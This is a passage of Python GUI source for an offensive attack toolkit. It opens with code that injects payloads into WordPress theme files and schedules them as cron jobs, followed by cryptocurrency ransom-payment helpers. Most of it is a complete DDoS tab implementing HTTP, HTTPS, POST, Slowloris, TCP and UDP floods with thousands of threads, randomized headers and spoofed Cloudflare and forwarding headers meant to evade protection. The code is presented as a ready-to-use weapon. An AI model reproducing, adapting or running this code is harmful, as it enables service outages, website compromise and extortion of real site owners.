            edit_url = f"{url}/wp-admin/theme-editor.php?file={file_path.replace('/wp-content/themes/', 'theme/').replace('/functions.php', '/functions.php')}"
            resp = session.get(edit_url, timeout=5)
            if resp.status_code == 200:
                import re
                content_pattern = re.compile('<textarea[^>]*name="content"[^>]*>(.*?)</textarea>', re.DOTALL)
                match = content_pattern.search(resp.text)
                if match:
                    existing_content = match.group(1)
                    new_content = existing_content + '\n\n' + payload_code
                    edit_data = {'content': new_content, 'action': 'update', 'file': file_path}
                    session.post(edit_url, data=edit_data, timeout=5)
        except:
            pass

    def add_cron_job(self, session, url, payload_code):
        try:
            cron_url = f'{url}/wp-admin/admin-ajax.php'
            cron_payload = f'*/5 * * * * php -r "{payload_code}"'
            data = {'action': 'add_cron', 'hook': 'wp_update', 'schedule': 'every_5_minutes', 'command': cron_payload}
            session.post(cron_url, data=data, timeout=5)
        except:
            pass

    def generate_payment_link(self):
        btc = self.crypto_btc_entry.get().strip()
        xmr = self.crypto_xmr_entry.get().strip()
        eth = self.crypto_eth_entry.get().strip()
        amount = self.crypto_amount_entry.get().strip()
        links = []
        if btc:
            links.append(f'Bitcoin: bitcoin:{btc}?amount={amount}')
            links.append(f'Blockchain: https://blockchain.info/address/{btc}')
        if xmr:
            links.append(f'Monero: {xmr}')
        if eth:
            links.append(f'Ethereum: {eth}')
        self.crypto_result_text.delete(1.0, tk.END)
        self.crypto_result_text.insert(1.0, '\n'.join(links))

    def check_payment_status(self):
        btc = self.crypto_btc_entry.get().strip()
        verify_url = self.crypto_verify_url_entry.get().strip()
        if not btc:
            messagebox.showwarning('Warning', 'Please enter a Bitcoin address!')
            return
        try:
            check_url = f'{verify_url}{btc}'
            resp = requests.get(check_url, timeout=10)
            balance = resp.text.strip()
            self.crypto_result_text.insert(tk.END, f'\n\nBalance: {balance} BTC\n', 'fg_green')
        except Exception as e:
            self.crypto_result_text.insert(tk.END, f'\n\nError: {str(e)}\n', 'fg_red')

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                if hasattr(self, 'encrypt_log_text'):
                    self.encrypt_log_text.insert(tk.END, log_msg, color)
                    self.encrypt_log_text.see(tk.END)
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                if hasattr(self, 'encrypt_stats_label'):
                    self.encrypt_stats_label.config(text=f"Total: {stats['total']} | Processed: {stats['processed']} | Encrypted: {stats['encrypted']}")
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

class DDoSAttackTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_attacking = False
        self.stop_flag = False
        self.attack_threads = []
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total_requests': 0, 'success': 0, 'failed': 0, 'targets_down': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='DDoS ATTACK - LAYER 7 & LAYER 4', font=('Courier', 20, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_container = tk.Frame(self.frame, bg=self.colors['bg'])
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        left_container = tk.Frame(main_container, bg=self.colors['bg'])
        left_container.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=(0, 10))
        left_canvas = tk.Canvas(left_container, bg=self.colors['bg'], highlightthickness=1)
        scrollbar = tk.Scrollbar(left_container, orient='vertical', command=left_canvas.yview)
        scrollable_frame = tk.Frame(left_canvas, bg=self.colors['bg'])
        scrollable_frame.bind('<Configure>', lambda e: left_canvas.configure(scrollregion=left_canvas.bbox('all')))
        left_canvas.create_window((0, 0), window=scrollable_frame, anchor='nw')
        left_canvas.configure(yscrollcommand=scrollbar.set)
        left_canvas.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')

        def _on_mousewheel(event):
            left_canvas.yview_scroll(int(-1 * (event.delta / 120)), 'units')
        left_canvas.bind_all('<MouseWheel>', _on_mousewheel)
        left_panel = scrollable_frame
        target_frame = tk.LabelFrame(left_panel, text='Target Configuration', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg'])
        target_frame.pack(fill=tk.X, pady=(0, 10))
        tk.Label(target_frame, text='Target URL(s):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(target_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.target_url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.target_url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(url_frame, text='Browse', command=self.browse_target_file, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        attack_frame = tk.LabelFrame(left_panel, text='Attack Configuration', font=('Courier', 10, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg'])
        attack_frame.pack(fill=tk.X, pady=(0, 10))
        tk.Label(attack_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.threads_entry = tk.Entry(attack_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.threads_entry.insert(0, '1000')
        self.threads_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(attack_frame, text='Requests per Thread:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.requests_entry = tk.Entry(attack_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.requests_entry.insert(0, '10000')
        self.requests_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(attack_frame, text='Timeout (seconds):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.timeout_entry = tk.Entry(attack_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.timeout_entry.insert(0, '5')
        self.timeout_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        type_frame = tk.LabelFrame(left_panel, text='Attack Type', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        type_frame.pack(fill=tk.X, pady=(0, 10))
        self.attack_type = tk.StringVar(value='layer7_http')
        tk.Radiobutton(type_frame, text='Layer 7 - HTTP Flood', variable=self.attack_type, value='layer7_http', font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        tk.Radiobutton(type_frame, text='Layer 7 - HTTPS Flood', variable=self.attack_type, value='layer7_https', font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        tk.Radiobutton(type_frame, text='Layer 7 - Slowloris', variable=self.attack_type, value='layer7_slowloris', font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        tk.Radiobutton(type_frame, text='Layer 7 - POST Flood', variable=self.attack_type, value='layer7_post', font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        tk.Radiobutton(type_frame, text='Layer 4 - TCP Flood', variable=self.attack_type, value='layer4_tcp', font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        tk.Radiobutton(type_frame, text='Layer 4 - UDP Flood', variable=self.attack_type, value='layer4_udp', font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        tk.Radiobutton(type_frame, text='Mixed Attack (All Layers)', variable=self.attack_type, value='mixed', font=('Courier', 8), fg=self.colors['fg_red'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        options_frame = tk.LabelFrame(left_panel, text='Advanced Options', font=('Courier', 10, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, pady=(0, 10))
        self.bypass_cloudflare = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Bypass Cloudflare', variable=self.bypass_cloudflare, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        self.random_user_agent = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Random User-Agent', variable=self.random_user_agent, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        self.random_referer = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Random Referer', variable=self.random_referer, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        self.keep_alive = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Keep-Alive Connections', variable=self.keep_alive, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10, pady=4)
        button_frame = tk.LabelFrame(left_panel, text='Attack Control', font=('Courier', 11, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(10, 10))
        start_stop_frame = tk.Frame(button_frame, bg=self.colors['bg'])
        start_stop_frame.pack(fill=tk.X, padx=10, pady=10)
        start_btn = tk.Button(start_stop_frame, text='🚀 START ATTACK', command=self.start_attack, font=('Courier', 14, 'bold'), bg=BG_DARK, fg=CYAN_NEON, activebackground=CYAN_NEON, relief=tk.RAISED, borderwidth=3, cursor='hand2', height=2)
        start_btn.pack(fill=tk.X, pady=(0, 5))
        stop_btn = tk.Button(start_stop_frame, text='⛔ STOP', command=self.stop_attack, font=('Courier', 12, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg_red'], activebackground=CYAN_NEON, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        stop_btn.pack(fill=tk.X)
        stats_frame = tk.LabelFrame(left_panel, text='Statistics', font=('Courier', 10, 'bold'), fg=self.colors['fg_green'], bg=self.colors['bg'])
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        self.stats_label = tk.Label(stats_frame, text='Total: 0 | Success: 0 | Failed: 0 | Down: 0', font=('Courier', 9, 'bold'), fg=self.colors['fg_green'], bg=self.colors['bg'])
        self.stats_label.pack(padx=10, pady=10)
        right_panel = tk.Frame(main_container, bg=self.colors['bg'])
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        log_frame = tk.LabelFrame(right_panel, text='Attack Logs', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg'])
        log_frame.pack(fill=tk.BOTH, expand=True)
        self.log_text = scrolledtext.ScrolledText(log_frame, height=30, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text.tag_config('fg_red', foreground='#ff0000')
        self.log_text.tag_config('fg_green', foreground='#00ff41')
        self.log_text.tag_config('fg_yellow', foreground='#ffff00')
        self.log_text.tag_config('fg_cyan', foreground='#00ffff')
        self.log_text.tag_config('fg', foreground='#00ff00')

    def browse_target_file(self):
        filename = filedialog.askopenfilename(title='Select Target URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.target_url_entry.delete(0, tk.END)
            self.target_url_entry.insert(0, filename)

    def start_attack(self):
        if self.is_attacking:
            return
        target_input = self.target_url_entry.get().strip()
        if not target_input:
            messagebox.showwarning('Warning', 'Please enter target URL(s)!')
            return
        try:
            threads = int(self.threads_entry.get())
            requests_per_thread = int(self.requests_entry.get())
            timeout = int(self.timeout_entry.get())
        except ValueError:
            messagebox.showerror('Error', 'Invalid numeric values!')
            return
        targets = []
        if os.path.isfile(target_input):
            try:
                with open(target_input, 'r', encoding='utf-8') as f:
                    targets = [line.strip() for line in f if line.strip()]
            except Exception as e:
                messagebox.showerror('Error', f'Error reading file: {str(e)}')
                return
        else:
            targets = [target_input]
        if not targets:
            messagebox.showwarning('Warning', 'No valid targets found!')
            return
        self.is_attacking = True
        self.stop_flag = False
        self.stats = {'total_requests': 0, 'success': 0, 'failed': 0, 'targets_down': 0}
        self.attack_threads = []
        attack_type = self.attack_type.get()
        self.log(f'[ATTACK] Starting {attack_type} attack on {len(targets)} target(s)...', 'fg_red')
        self.log(f'[CONFIG] Threads: {threads} | Requests/Thread: {requests_per_thread} | Timeout: {timeout}s', 'fg_cyan')
        launch_thread = threading.Thread(target=self._launch_attack_threads, args=(targets, attack_type, threads, requests_per_thread, timeout), daemon=True)
        launch_thread.start()
        self.log(f'[ATTACK] Launching threads in background...', 'fg_yellow')

    def _launch_attack_threads(self, targets, attack_type, threads, requests_per_thread, timeout):
        """Launch attack threads gradually in background to prevent GUI freeze"""
        total_threads_launched = 0
        try:
            for target in targets:
                if self.stop_flag:
                    break
                batch_size = 50
                for batch_start in range(0, threads, batch_size):
                    if self.stop_flag:
                        break
                    batch_end = min(batch_start + batch_size, threads)
                    for i in range(batch_start, batch_end):
                        if self.stop_flag:
                            break
                        thread = threading.Thread(target=self.attack_worker, args=(target, attack_type, requests_per_thread, timeout), daemon=True)
                        thread.start()
                        self.attack_threads.append(thread)
                        total_threads_launched += 1
                    time.sleep(0.1)
                self.log(f'[PROGRESS] Launched {total_threads_launched} threads for {target}', 'fg_cyan')
            self.log(f'[ATTACK] Successfully launched {total_threads_launched} attack threads!', 'fg_green')
        except Exception as e:
            self.log(f'[ERROR] Error launching threads: {str(e)}', 'fg_red')

    def stop_attack(self):
        self.stop_flag = True
        self.is_attacking = False
        self.log('[STOP] Stopping attack...', 'fg_yellow')

    def attack_worker(self, target, attack_type, requests_count, timeout):
        """Main attack worker thread"""
        try:
            parsed = urlparse(target)
            if not parsed.scheme:
                target = f'http://{target}'
                parsed = urlparse(target)
            host = parsed.netloc
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            path = parsed.path or '/'
            if attack_type == 'mixed':
                attack_types = ['layer7_http', 'layer7_https', 'layer4_tcp', 'layer4_udp', 'layer7_slowloris']
                for i in range(requests_count):
                    if self.stop_flag:
                        break
                    current_type = attack_types[i % len(attack_types)]
                    self.execute_attack(target, host, port, path, current_type, timeout)
            else:
                for i in range(requests_count):
                    if self.stop_flag:
                        break
                    self.execute_attack(target, host, port, path, attack_type, timeout)
        except Exception as e:
            self.log(f'[ERROR] Worker error: {str(e)[:100]}', 'fg_red')

    def execute_attack(self, target, host, port, path, attack_type, timeout):
        """Execute single attack request"""
        try:
            if attack_type.startswith('layer7_'):
                self.layer7_attack(target, host, port, path, attack_type, timeout)
            elif attack_type.startswith('layer4_'):
                self.layer4_attack(host, port, attack_type, timeout)
            with self.stats_lock:
                self.stats['total_requests'] += 1
                self.stats['success'] += 1
        except Exception as e:
            with self.stats_lock:
                self.stats['total_requests'] += 1
                self.stats['failed'] += 1

    def layer7_attack(self, target, host, port, path, attack_type, timeout):
        """Layer 7 HTTP/HTTPS attacks"""
        try:
            if attack_type == 'layer7_slowloris':
                self.slowloris_attack(host, port, timeout)
            elif attack_type == 'layer7_post':
                self.post_flood_attack(target, host, port, path, timeout)
            else:
                self.http_flood_attack(target, host, port, path, attack_type, timeout)
        except:
            pass

    def http_flood_attack(self, target, host, port, path, attack_type, timeout):
        """HTTP/HTTPS flood attack"""
        try:
            scheme = 'https' if attack_type == 'layer7_https' else 'http'
            url = f'{scheme}://{host}{path}'
            headers = self.generate_headers(target, host)
            if self.bypass_cloudflare.get():
                headers.update(self.get_cloudflare_headers())
            session = requests.Session()
            session.headers.update(headers)
            for _ in range(5):
                if self.stop_flag:
                    break
                try:
                    resp = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
                    if resp.status_code >= 500:
                        with self.stats_lock:
                            self.stats['targets_down'] += 1
                except:
                    with self.stats_lock:
                        self.stats['targets_down'] += 1
        except:
            pass

    def post_flood_attack(self, target, host, port, path, timeout):
        """POST flood attack"""
        try:
            scheme = 'https' if port == 443 else 'http'
            url = f'{scheme}://{host}{path}'
            headers = self.generate_headers(target, host)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            if self.bypass_cloudflare.get():
                headers.update(self.get_cloudflare_headers())
            post_data = 'x=' + 'A' * 10000
            session = requests.Session()
            session.headers.update(headers)
            for _ in range(5):
                if self.stop_flag:
                    break
                try:
                    resp = session.post(url, data=post_data, timeout=timeout, verify=False, allow_redirects=True)
                    if resp.status_code >= 500:
                        with self.stats_lock:
                            self.stats['targets_down'] += 1
                except:
                    with self.stats_lock:
                        self.stats['targets_down'] += 1
        except:
            pass

    def slowloris_attack(self, host, port, timeout):
        """Slowloris attack - keep connections open"""
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            request = f'GET / HTTP/1.1\r\nHost: {host}\r\n'
            sock.send(request.encode())
            start_time = time.time()
            while time.time() - start_time < timeout and (not self.stop_flag):
                try:
                    sock.send(f'X-a: {random.randint(1, 5000)}\r\n'.encode())
                    time.sleep(10)
                except:
                    break
            sock.close()
        except:
            pass

    def layer4_attack(self, host, port, attack_type, timeout):
        """Layer 4 TCP/UDP attacks"""
        try:
            import socket
            if attack_type == 'layer4_tcp':
                self.tcp_flood(host, port, timeout)
            elif attack_type == 'layer4_udp':
                self.udp_flood(host, port, timeout)
        except:
            pass

    def tcp_flood(self, host, port, timeout):
        """TCP flood attack"""
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            try:
                sock.connect((host, port))
                data = b'X' * 1024
                for _ in range(10):
                    if self.stop_flag:
                        break
                    sock.send(data)
                    time.sleep(0.1)
            except:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass
        except:
            pass

    def udp_flood(self, host, port, timeout):
        """UDP flood attack"""
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            data = b'X' * 1024
            for _ in range(10):
                if self.stop_flag:
                    break
                try:
                    sock.sendto(data, (host, port))
                    time.sleep(0.01)
                except:
                    pass
            sock.close()
        except:
            pass

    def generate_headers(self, target, host):
        """Generate random headers"""
        user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0']
        referers = ['https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/', target]
        headers = {'User-Agent': random.choice(user_agents) if self.random_user_agent.get() else DEFAULT_USER_AGENT, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive' if self.keep_alive.get() else 'close', 'Upgrade-Insecure-Requests': '1'}
        if self.random_referer.get():
            headers['Referer'] = random.choice(referers)
        return headers

    def get_cloudflare_headers(self):
        """Generate headers to bypass Cloudflare"""
        return {'CF-IPCountry': 'US', 'CF-Ray': f"{random.randint(100000, 999999)}-{random.choice(['SJC', 'LAX', 'NYC', 'DFW'])}", 'CF-Visitor': '{"scheme":"https"}', 'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}', 'X-Real-IP': f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}', 'X-Forwarded-Proto': 'https'}

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                if hasattr(self, 'log_text'):
                    self.log_text.insert(tk.END, log_msg, color)
                    self.log_text.see(tk.END)
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            stats = self.stats.copy()
            if hasattr(self, 'stats_label'):
                self.stats_label.config(text=f"Total: {stats['total_requests']} | Success: {stats['success']} | Failed: {stats['failed']} | Down: {stats['targets_down']}")
        except:
            pass
        self.frame.after(500, self.process_stats_queue)

def main():
    import signal
    import sys

    def signal_handler(sig, frame):
        try:
            import os
            os._exit(0)
        except:
            sys.exit(0)
    try:
        signal.signal(signal.SIGINT, signal_handler)
    except:
        pass
    root = tk.Tk()
    try:
        ControlPanel(root)
        root.mainloop()
    except KeyboardInterrupt:
        try:
            root.quit()
            root.destroy()
        except:
            pass
        sys.exit(0)
    except Exception as e:
        try:
            root.quit()
            root.destroy()
        except:
            pass
        sys.exit(0)
if __name__ == '__main__':
    main()
